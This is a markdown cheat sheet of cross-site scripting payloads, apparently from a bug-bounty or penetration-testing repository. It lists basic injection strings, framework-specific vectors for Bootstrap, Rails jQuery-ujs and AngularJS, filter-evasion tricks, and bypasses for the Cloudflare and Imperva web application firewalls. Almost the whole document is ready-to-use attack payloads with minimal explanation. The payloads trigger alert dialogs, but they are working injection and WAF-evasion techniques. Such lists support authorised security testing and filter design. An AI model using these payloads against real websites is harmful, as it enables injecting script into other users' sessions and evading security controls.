# Cross-site scripting (XSS)

>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.

## Summary 
- [Cross-site scripting (XSS)](#cross-site-scripting-xss)
  - [Summary](#summary)
    - [Basic XSS](#basic-xss)
    - [Useful Event Handlers](#useful-event-handlers)
    - [DOM-based XSS Filter Bypass](#dom-based-xss-filter-bypass)
    - [Bootstrap XSS](#bootstrap-xss)
    - [XSS from portswigger Labs](#xss-from-portswigger-labs)
    - [SVG XSS](#svg-xss)
    - [XSS in Rails apps that uses jQuery-ujs](#xss-in-rails-apps-that-uses-jquery-ujs)
    - [Angular-js XSS](#angular-js-xss)
    - [XSS in canonical link tag](#xss-in-canonical-link-tag)
    - [XSS in URL input](#xss-in-url-input)
    - [Bypass ' filter](#bypass--filter)
    - [Bypass `<script>` filter](#bypass-script-filter)
    - [Bypass 'javascript' filter](#bypass-javascript-filter)
      - [HTML encoding](#html-encoding)
    - [Bypass '>' filter](#bypass--filter-1)
  - [WAF Bypass](#waf-bypass)
    - [Cloudflare bypass](#cloudflare-bypass)
    - [Imperva bypass](#imperva-bypass)
  - [XSS Writeups :](#xss-writeups)
  - [Other Awesome XSS :fire:](#other-awesome-xss-fire)
  - [References](#references)
### Basic XSS 

```bash
<script>alert('XSS')</script>
```
```bash
<img src=x onerror=alert('XSS')>
```
```bash
javascript:alert('xss')
```
```bash
<svg onload=alert('XSS')>
```

### Useful Event Handlers
`onmouseover` `onclick` `onerror` `onfocus` `onload` `onstart` `onfinish` `onresize`

### DOM-based XSS Filter Bypass
by [@rodoassis](https://twitter.com/rodoassis/status/1257638920499625985)

```bash
Javascript://%E2%80%A9alert('xss')
```

### Bootstrap XSS
by [@rodoassis](https://twitter.com/rodoassis/status/1257638920499625985)

```bash
<Brute Data-Spy=scroll 
Data-Target='<Svg OnLoad=(confirm)('xss')>'>
```
### XSS from portswigger Labs

```bash
"><body onresize=alert('XSS')>
```
```bash
<xss id=x onfocus=alert('XSS') tabindex=1>#x
```

### SVG XSS
```bash
<svg/onload=alert('XSS')>
```
```bash
"><svg><discard onbegin=alert(1)>
```
```bash
<svg><a><animate+attributeName=href+values=javascript:alert('XSS') /><text+x=20+y=20>Click me</text></a>
```
### XSS in Rails apps that uses jQuery-ujs
by [@RenwaX23](https://twitter.com/RenwaX23/status/1260342626789863428)
```bash
<a data-remote="true" data-disable-with="<script>alert(23)</script>" href="#" >Click Me</a>

# May 12, 2020
```
### Angular-js XSS 

```bash
[[constructor.constructor('alert('XSS')')()]]
```
### XSS in canonical link tag
**Only in Chrome**

the victim should press

    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X

```bash
target.com/?'accesskey='x'onclick='alert('XSS')
```
### XSS in URL input

```bash
http://foo?&apos;-alert(1)-&apos;
```

### Bypass ' filter

>if `'alert(1)'` = `&apos;alert(1)&apos;` try :

```bash
'-alert(1)-'
```

### Bypass `<script>` filter

>nesting them inside other tags

```bash
<scr<script>ipt>document.write('XSS')</scr<script>ipt>
```
 
### Bypass 'javascript' filter

#### HTML encoding

```bash
&#106;avascript:alert('XSS')
```

### Bypass '>' filter

```bash
<svg onload="alert('XSS')" <="" svg=""
```
```bash
<svg/onload=confirm('XSS')//
```
```bash
<svg onload=alert('XSS')//
```


## WAF Bypass

### Cloudflare bypass
by [@bohdansec](https://twitter.com/bohdansec/status/1252643451792998402)
```bash
<svg/OnLoad="`${prompt``}`">
# Apr 21, 2020
```
by [@sratarun](https://twitter.com/sratarun/status/1253020991732584448)
```bash
%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx
# Apr 22, 2020
```
by [@netspooky](https://twitter.com/netspooky/status/1253462252524638208)
```bash
<uu src=@'@' onbigclick=import('//0a"&nbsp;"0a0a?0a/')>mou%09se<|/uu>:}
# Apr 24, 2020
```

by [@spyerror](https://twitter.com/spyerror/status/1250032421753495555)
```bash
≋ "><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋

# Apr 14, 2020
```

### Imperva bypass
by [@sratarun](https://twitter.com/sratarun/status/1250792816713719808)

```bash
tarun"><x/onafterscriptexecute=confirm%26lpar;)//
# Apr 16, 2020
```

by [@Tismayil1](https://twitter.com/Tismayil1/status/1255275250885038080)

```bash
<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
# Apr 29, 2020
```

by [@spyerror](https://twitter.com/spyerror/status/1248380806080299008)

```bash
<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
# Apr 9, 2020
```
## XSS Writeups : 
[$20000 Facebook DOM XSS](https://vinothkumar.me/20000-facebook-dom-xss/)

## Other Awesome XSS :fire: 

[Cross-site scripting (XSS) cheat sheet by Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## References
* [@avanish46](https://twitter.com/avanish46/status/1255159088708833280)
* [@vishnugadupudi](https://twitter.com/vishnugadupudi/status/1255163776539623434)
* [@sratarun](https://twitter.com/sratarun/status/1255442758464126976)
* [XSS Filter Evasion](https://www.netsparker.com/blog/web-security/xss-filter-evasion/)
* [Portswigger Cross-site scripting Labs](https://portswigger.net/web-security/all-labs)
* [Stored XSS via AngularJS Injection](https://hackerone.com/reports/141463)
* [wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
